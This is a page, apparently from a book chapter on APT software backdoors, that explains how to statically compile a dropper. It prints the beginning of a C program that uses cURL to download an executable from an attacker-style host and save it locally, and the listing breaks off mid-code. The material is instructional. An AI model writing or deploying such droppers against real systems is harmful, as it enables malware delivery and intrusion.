<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml"><head><title/><link rel="stylesheet" href="../css/base.min.css"/><link rel="stylesheet" href="../css/fancy.min.css"/><link rel="stylesheet" href="../css/pdf.css"/><meta name="viewport" content="width=640, height=824"/></head><body><div id="page_body"><div id="pf1a2" class="pf w2 h2" data-page-no="1a2"><div class="pc pc1a2 w2 h2"><div class="t m0 x6 h10 y83 ff2 fs2 fc0 sc0 ls8 ws0">Chapter 10: APT Software Backdoors<span class="_ _9"> </span><span class="ff1 fs9 lsa">395</span></div><div class="t m0 x4 hd y11c ff4 fs7 fc0 sc0 ls0 ws0">W<span class="_ _3"/>e’ll also statically compile the dropper<span class="_ _0"/>, which will include the cURL library in </div><div class="t m0 x3 hd y11d ff4 fs7 fc0 sc0 ls0 ws0">the ex<span class="_ _0"/>ecutable so we can transfer a single ex<span class="_ _0"/>ecutable rather than needing an external </div><div class="t m0 x3 hd y11e ff4 fs7 fc0 sc0 ls0 ws0">DLL.</div><div class="t m0 x3 h7 y2547 ff1 fs3 fc0 sc0 ls0 ws0">Basic HTTP Dropper</div><div class="t m0 x3 hd y2548 ff4 fs7 fc0 sc0 ls0 ws0">Let’<span class="_ _2"/>s start with an extremely simple example of a dropper that uses HTTP to request </div><div class="t m0 x3 hd y3e1 ff4 fs7 fc0 sc0 ls0 ws0">a single ex<span class="_ _0"/>ecutable, sav<span class="_ _0"/>es the le in the current directory<span class="_ _2"/>, and then ex<span class="_ _0"/>ecutes the le:</div><div class="t m0 x3 h40 y2549 fff fs5 fc0 sc0 ls0 ws0">/* file: http_dropper.c */</div><div class="t m0 x3 h40 y254a fff fs5 fc0 sc0 ls0 ws0">#define PROTO "http"</div><div class="t m0 x3 h40 y254b fff fs5 fc0 sc0 ls0 ws0">#define WEBSITE "www.apthacker.com"</div><div class="t m0 x3 h40 y254c fff fs5 fc0 sc0 ls0 ws0">#define FILENAME "program.exe"</div><div class="t m0 x3 h40 y254d fff fs5 fc0 sc0 ls0 ws0">#define CURL_STATICLIB</div><div class="t m0 x3 h40 y254e fff fs5 fc0 sc0 ls0 ws0">#include &lt;stdio.h&gt;</div><div class="t m0 x3 h40 y254f fff fs5 fc0 sc0 ls0 ws0">#include &lt;curl/curl.h&gt;</div><div class="t m0 x3 h40 y2550 fff fs5 fc0 sc0 ls0 ws0">// Callback function to write data from CURL request</div><div class="t m0 x3 h40 y2551 fff fs5 fc0 sc0 ls0 ws0">size_t write_callback(void *buffer, size_t size, size_t nitems, void *userp);</div><div class="t m0 x3 h40 y2552 fff fs5 fc0 sc0 ls0 ws0">int main(void)</div><div class="t m0 x3 h40 y2553 fff fs5 fc0 sc0 ls0 ws0">{</div><div class="t m0 x3 h40 y2554 fff fs5 fc0 sc0 ls0 ws0">  CURL *curl;</div><div class="t m0 x3 h40 y2555 fff fs5 fc0 sc0 ls0 ws0">  CURLcode res;</div><div class="t m0 x3 h40 y2556 fff fs5 fc0 sc0 ls0 ws0">/* curl write_callback takes a pointer to this file arg to output file */</div><div class="t m0 x3 h40 y2557 fff fs5 fc0 sc0 ls0 ws0">  FILE *outFile; </div><div class="t m0 x3 h40 y2558 fff fs5 fc0 sc0 ls0 ws0">  outFile=fopen( FILENAME , "wb");</div><div class="t m0 x3 h40 y2559 fff fs5 fc0 sc0 ls0 ws0">  char finalURL[512];</div><div class="t m0 x3 h40 y255a fff fs5 fc0 sc0 ls0 ws0">  memset(finalURL, sizeof(finalURL), ‘\0’);</div><div class="t m0 x3 h40 y255b fff fs5 fc0 sc0 ls0 ws0">/* assemble url to request based on defines */</div><div class="t m0 x3 h40 y255c fff fs5 fc0 sc0 ls0 ws0">  strcat( finalURL, PROTO);</div><div class="t m0 x3 h40 y255d fff fs5 fc0 sc0 ls0 ws0">  strcat( finalURL, "://");</div><div class="t m0 x3 h40 y255e fff fs5 fc0 sc0 ls0 ws0">  strcat( finalURL, WEBSITE);</div><div class="t m0 x3 h40 y255f fff fs5 fc0 sc0 ls0 ws0">  strcat( finalURL, "/");</div><div class="t m0 x3 h40 y2560 fff fs5 fc0 sc0 ls0 ws0">  strcat( finalURL, FILENAME);</div><div class="t m0 x3 h40 y2561 fff fs5 fc0 sc0 ls0 ws0">  curl = curl_easy_init();</div><div class="t m0 x3 h40 y2562 fff fs5 fc0 sc0 ls0 ws0">  if(curl) {</div><div class="t m0 x3 h40 y2563 fff fs5 fc0 sc0 ls0 ws0">    curl_easy_setopt(curl, CURLOPT_URL, finalURL );</div><div class="t m0 x3 h40 y2564 fff fs5 fc0 sc0 ls0 ws0">   /* curlopt_writefunction must be used with </div><div class="t m0 x3 h40 y2565 fff fs5 fc0 sc0 ls0 ws0">      curlopt_writedata on a windows box or it will crash the prog */</div></div><div class="pi" data-data="{&#34;ctm&#34;:[1.209373,0.000000,0.000000,1.209373,0.000000,0.000000]}"/></div></div></body></html>